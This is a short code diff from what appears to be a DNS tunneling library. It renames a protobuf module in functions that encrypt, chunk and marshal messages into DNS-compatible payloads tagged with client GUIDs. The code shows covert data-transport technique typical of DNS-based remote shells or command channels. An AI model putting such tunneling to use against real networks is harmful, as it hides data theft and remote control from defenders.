@@ -3,7 +3,7 @@ import binascii
 from typing import Tuple, List, Optional
 
 from lib.crypto.symetric import seal, open_sealed
-from lib.protocol import chacomm_pb2
+from lib.protocol import comm_pb2
 from lib.spliting.split import split, splits
 
 
@@ -51,7 +51,7 @@ def decode(payload: str, encryption_key: str) -> Tuple[Optional[bytes], bool]:
         return None, False
     
     # Parse the "Message" part of the Protocol buffer packet
-    message = chacomm_pb2.Message()
+    message = comm_pb2.Message()
     try:
         message.ParseFromString(output)
     except Exception as e:
@@ -94,7 +94,7 @@ def decode(payload: str, encryption_key: str) -> Tuple[Optional[bytes], bool]:
     return None, False
 
 
-def dns_marshal(pb_message: chacomm_pb2.Message, encryption_key: str, is_request: bool) -> str:
+def dns_marshal(pb_message: comm_pb2.Message, encryption_key: str, is_request: bool) -> str:
     """
     Marshal a protobuf message into an encrypted DNS-compatible format.
     
@@ -154,9 +154,9 @@ def encode(payload: bytes, is_request: bool, encryption_key: str,
     _current_chunk += 1
     
     # Generate the init packet, containing information about the number of chunks
-    init_message = chacomm_pb2.Message(
+    init_message = comm_pb2.Message(
         clientguid=client_guid,
-        chunkstart=chacomm_pb2.ChunkStart(
+        chunkstart=comm_pb2.ChunkStart(
             chunkid=_current_chunk,
             chunksize=len(packets)
         )
@@ -171,9 +171,9 @@ def encode(payload: bytes, is_request: bool, encryption_key: str,
     # Iterate over every chunk
     for chunk_num, packet_data in enumerate(packets):
         # Generate the "data" packet, containing the current chunk information and data
-        data_message = chacomm_pb2.Message(
+        data_message = comm_pb2.Message(
             clientguid=client_guid,
-            chunkdata=chacomm_pb2.ChunkData(
+            chunkdata=comm_pb2.ChunkData(
                 chunkid=_current_chunk,
                 chunknum=chunk_num,
                 packet=packet_data
